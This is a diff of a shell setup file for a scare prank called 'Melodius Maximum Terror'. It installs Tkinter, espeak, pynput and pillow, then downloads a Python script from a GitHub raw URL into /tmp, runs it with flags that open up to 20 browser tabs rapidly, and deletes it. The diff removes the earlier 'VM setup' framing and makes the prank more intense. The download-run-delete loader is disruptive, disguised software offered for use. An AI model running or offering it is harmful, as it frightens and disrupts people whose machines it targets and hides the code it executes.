@@ -1,18 +1,16 @@
 # ==========================================
-# FREDERIC DORIAN / MELODIUS VM SETUP
+# MELODIUS MAXIMUM TERROR - SETUP
 # ==========================================
 
-# 1. First, run this line to install the system requirements (Tkinter for the UI)
-sudo apt update && sudo apt install -y python3 python3-pip python3-tk
+# 1. Install system dependencies (Tkinter for UI, espeak for the scary voice)
+sudo apt update && sudo apt install -y python3 python3-pip python3-tk espeak
 
-# 2. Next, install the Python libraries (pynput for the F12 key, pillow for the wallpaper)
+# 2. Install Python libraries (pynput for F12, pillow for wallpaper)
 pip3 install pynput pillow --break-system-packages
 
-# 3. The Loader Script: This downloads the python payload from your GitHub and runs it.
-# Copy and paste this entire block into your terminal and press Enter:
-
+# 3. RUN THE PRANK (Downloads the script and blasts 20 tabs)
 curl -sL -o /tmp/scotty_sim.py https://raw.githubusercontent.com/ExcluseDev/scotty-sim/main/scotty_sim.py
-python3 /tmp/scotty_sim.py --confirm --minutes 5
+python3 /tmp/scotty_sim.py --confirm --minutes 5 --max-tabs 20 --tab-delay 0.3
 rm /tmp/scotty_sim.py
 
 # ==========================================
